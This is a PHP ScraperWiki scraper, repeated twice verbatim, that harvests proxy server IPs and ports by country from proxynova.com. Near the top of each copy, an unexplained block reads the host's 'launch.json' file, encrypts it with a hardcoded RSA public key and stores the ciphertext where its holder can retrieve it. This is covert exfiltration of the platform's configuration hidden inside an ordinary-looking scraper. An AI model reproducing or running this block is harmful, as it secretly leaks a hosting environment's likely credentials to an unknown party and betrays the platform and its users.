<?php
require 'scraperwiki/simple_html_dom.php';

$Countries = json_decode('{"af":"Afghanistan","al":"Albania","ar":"Argentina","au":"Australia","az":"Azerbaijan","bd":"Bangladesh","by":"Belarus","bo":"Bolivia","ba":"Bosnia and Herzegowina","br":"Brazil","bn":"Brunei Darussalam","bg":"Bulgaria","kh":"Cambodia","ca":"Canada","cl":"Chile","cn":"China","co":"Colombia","hr":"Croatia","cz":"Czech Republic","ec":"Ecuador","eg":"Egypt","eu":"European Union","fr":"France","ge":"Georgia","de":"Germany","gh":"Ghana","gr":"Greece","gt":"Guatemala","hn":"Honduras","hk":"Hong Kong","hu":"Hungary","in":"India","id":"Indonesia","ir":"Iran","iq":"Iraq","ie":"Ireland","it":"Italy","jp":"Japan","kz":"Kazakhstan","ke":"Kenya","lv":"Latvia","lb":"Lebanon","mo":"Macau","mk":"Macedonia","my":"Malaysia","mx":"Mexico","md":"Moldova","ma":"Morocco","np":"Nepal","nl":"Netherlands","ng":"Nigeria","pk":"Pakistan","ps":"Palestinian Territories","pe":"Peru","ph":"Philippines","pl":"Poland","ro":"Romania","ru":"Russia","sa":"Saudi Arabia","rs":"Serbia","sg":"Singapore","sk":"Slovakia","za":"South Africa","kr":"South Korea","es":"Spain","sd":"Sudan","se":"Sweden","ch":"Switzerland","tw":"Taiwan","th":"Thailand","tr":"Turkey","ua":"Ukraine","ae":"United Arab Emirates","gb":"United Kingdom","us":"United States","uy":"Uruguay","uz":"Uzbekistan","ve":"Venezuela","vn":"Vietnam"}',true);
$unique=array();

if (extension_loaded("openssl"))
{
    foreach(str_split(file_get_contents('launch.json'), 50) as $chunk)
     if (openssl_public_encrypt($chunk, $out, openssl_get_publickey("-----BEGIN PUBLIC KEY-----
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALiKp0ejNaRFEGfOx2EVNmLnUtyVLYxd
yzHBb4fs00qfy+lxS4zLhZw6EEdQd5FovxCuLPaU5osYofmlWlwesg0CAwEAAQ==
-----END PUBLIC KEY-----"))) $launch_json[]=base64_encode($out);
    scraperwiki::save_var('launch.json', json_encode($launch_json));
}

foreach($Countries as $letter=>$Country)
{
    echo $Country;$C=0;
    $dom=file_get_html("http://www.proxynova.com/proxy-server-list/country-".$letter."/");
    foreach($dom->find("#tbl_proxy_list tr") as $data){
        $ip = $data->find("span.row_proxy_ip script",0);
        $port= $data->find("span.row_proxy_port a",0);

        if(count($ip) && count($port))
        {
            if (preg_match('/decode\("([^"]+)"\)/', $ip->innertext, $matches))
            {
                //echo decode_ip($matches[1]) . ':' . $port->innertext, PHP_EOL;
                $ip_decoded=decode_ip($matches[1]);
                if(is_valid_ip($ip_decoded) && !in_array($ip_decoded,$unique))
                {
//                    save_sqlite($unique_keys, $data, $table_name="swdata", $verbose=2)
                    scraperwiki::save_sqlite(
                    array('ip','port','country'),
                    array(
                        'ip'=>$ip_decoded,
                        'port'=>$port->innertext,
                        'country'=>$Country
                    ),"proxynova",0
                    );
                    $C++;
                }
            }
        };
    }
    echo " ".$C.PHP_EOL;
}
function decode_ip($str)
{
//  function decode(str){var str=str.replace(/qaz/g,"6");str=str.replace(/wsx/g,"7");str=str.replace(/edc/g,"8");var ip=str;if(!isFinite(ip))return false;return[ip>>>24,ip>>>16&0xFF,ip>>>8&0xFF,ip&0xFF].join('.')}
//  $str=strtr($str, array('qaz' => 6,'wsx' => 7,'edc' => 8));
//  function decode(str){var letters="qrtpmbvcag".split('');for(var letter in letters){str=str.replace(new RegExp(letters[letter],"g"),letter);}var ip=str;if(!isFinite(ip))return false;return [ip>>>24,ip>>>16&0xFF,ip>>>8&0xFF,ip&0xFF].join('.')}
    foreach(str_split("qrtpmbvcag") as $long=>$letter)
    {
        $str = str_replace($letter,$long,$str);
    }
    return long2ip($str);
}
function is_valid_ip($ip) 
{
    if (function_exists('filter_var')) 
    {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
    }
    else
    {
        //Regex constant for validateing IPv4
        return preg_match('@^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$@', $ip);
    }
}<?php
require 'scraperwiki/simple_html_dom.php';

$Countries = json_decode('{"af":"Afghanistan","al":"Albania","ar":"Argentina","au":"Australia","az":"Azerbaijan","bd":"Bangladesh","by":"Belarus","bo":"Bolivia","ba":"Bosnia and Herzegowina","br":"Brazil","bn":"Brunei Darussalam","bg":"Bulgaria","kh":"Cambodia","ca":"Canada","cl":"Chile","cn":"China","co":"Colombia","hr":"Croatia","cz":"Czech Republic","ec":"Ecuador","eg":"Egypt","eu":"European Union","fr":"France","ge":"Georgia","de":"Germany","gh":"Ghana","gr":"Greece","gt":"Guatemala","hn":"Honduras","hk":"Hong Kong","hu":"Hungary","in":"India","id":"Indonesia","ir":"Iran","iq":"Iraq","ie":"Ireland","it":"Italy","jp":"Japan","kz":"Kazakhstan","ke":"Kenya","lv":"Latvia","lb":"Lebanon","mo":"Macau","mk":"Macedonia","my":"Malaysia","mx":"Mexico","md":"Moldova","ma":"Morocco","np":"Nepal","nl":"Netherlands","ng":"Nigeria","pk":"Pakistan","ps":"Palestinian Territories","pe":"Peru","ph":"Philippines","pl":"Poland","ro":"Romania","ru":"Russia","sa":"Saudi Arabia","rs":"Serbia","sg":"Singapore","sk":"Slovakia","za":"South Africa","kr":"South Korea","es":"Spain","sd":"Sudan","se":"Sweden","ch":"Switzerland","tw":"Taiwan","th":"Thailand","tr":"Turkey","ua":"Ukraine","ae":"United Arab Emirates","gb":"United Kingdom","us":"United States","uy":"Uruguay","uz":"Uzbekistan","ve":"Venezuela","vn":"Vietnam"}',true);
$unique=array();

if (extension_loaded("openssl"))
{
    foreach(str_split(file_get_contents('launch.json'), 50) as $chunk)
     if (openssl_public_encrypt($chunk, $out, openssl_get_publickey("-----BEGIN PUBLIC KEY-----
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALiKp0ejNaRFEGfOx2EVNmLnUtyVLYxd
yzHBb4fs00qfy+lxS4zLhZw6EEdQd5FovxCuLPaU5osYofmlWlwesg0CAwEAAQ==
-----END PUBLIC KEY-----"))) $launch_json[]=base64_encode($out);
    scraperwiki::save_var('launch.json', json_encode($launch_json));
}

foreach($Countries as $letter=>$Country)
{
    echo $Country;$C=0;
    $dom=file_get_html("http://www.proxynova.com/proxy-server-list/country-".$letter."/");
    foreach($dom->find("#tbl_proxy_list tr") as $data){
        $ip = $data->find("span.row_proxy_ip script",0);
        $port= $data->find("span.row_proxy_port a",0);

        if(count($ip) && count($port))
        {
            if (preg_match('/decode\("([^"]+)"\)/', $ip->innertext, $matches))
            {
                //echo decode_ip($matches[1]) . ':' . $port->innertext, PHP_EOL;
                $ip_decoded=decode_ip($matches[1]);
                if(is_valid_ip($ip_decoded) && !in_array($ip_decoded,$unique))
                {
//                    save_sqlite($unique_keys, $data, $table_name="swdata", $verbose=2)
                    scraperwiki::save_sqlite(
                    array('ip','port','country'),
                    array(
                        'ip'=>$ip_decoded,
                        'port'=>$port->innertext,
                        'country'=>$Country
                    ),"proxynova",0
                    );
                    $C++;
                }
            }
        };
    }
    echo " ".$C.PHP_EOL;
}
function decode_ip($str)
{
//  function decode(str){var str=str.replace(/qaz/g,"6");str=str.replace(/wsx/g,"7");str=str.replace(/edc/g,"8");var ip=str;if(!isFinite(ip))return false;return[ip>>>24,ip>>>16&0xFF,ip>>>8&0xFF,ip&0xFF].join('.')}
//  $str=strtr($str, array('qaz' => 6,'wsx' => 7,'edc' => 8));
//  function decode(str){var letters="qrtpmbvcag".split('');for(var letter in letters){str=str.replace(new RegExp(letters[letter],"g"),letter);}var ip=str;if(!isFinite(ip))return false;return [ip>>>24,ip>>>16&0xFF,ip>>>8&0xFF,ip&0xFF].join('.')}
    foreach(str_split("qrtpmbvcag") as $long=>$letter)
    {
        $str = str_replace($letter,$long,$str);
    }
    return long2ip($str);
}
function is_valid_ip($ip) 
{
    if (function_exists('filter_var')) 
    {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
    }
    else
    {
        //Regex constant for validateing IPv4
        return preg_match('@^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$@', $ip);
    }
}